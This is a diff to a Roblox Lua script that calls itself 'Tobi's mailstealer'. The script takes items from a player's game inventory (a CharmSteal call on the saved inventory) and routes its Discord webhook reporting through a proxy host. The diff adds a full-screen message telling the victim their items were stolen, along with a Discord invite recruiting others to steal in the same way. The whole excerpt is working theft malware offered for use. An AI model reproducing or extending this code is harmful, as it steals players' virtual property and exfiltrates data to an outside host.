@@ -24,7 +24,9 @@ function SendMessage(url, message)
     })
 end
 
-Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+if Webhook and Webhook ~= "" then
+	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+end
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
@@ -247,6 +249,43 @@ end
 if save.Charm ~= nil then
     CharmSteal()
 end
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.StarterGui.Model
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(0, 1911, 0, 798)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.308833092, 0, 0.170426071, 0)
+TextLabel.Size = UDim2.new(0, 746, 0, 338)
+TextLabel.Font = Enum.Font.LuckiestGuy
+TextLabel.Text = "All your items have just been stolen by Tobi's mailstealer"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 41.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.360834211, 0, 0.786967397, 0)
+TextLabel_2.Size = UDim2.new(0, 533, 0, 146)
+TextLabel_2.Font = Enum.Font.FredokaOne
+TextLabel_2.Text = "Join discord.gg/HcpNe56R2a to start mailstealing yourself"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 54.000
 
 --while true do
 	--wait(1.25)
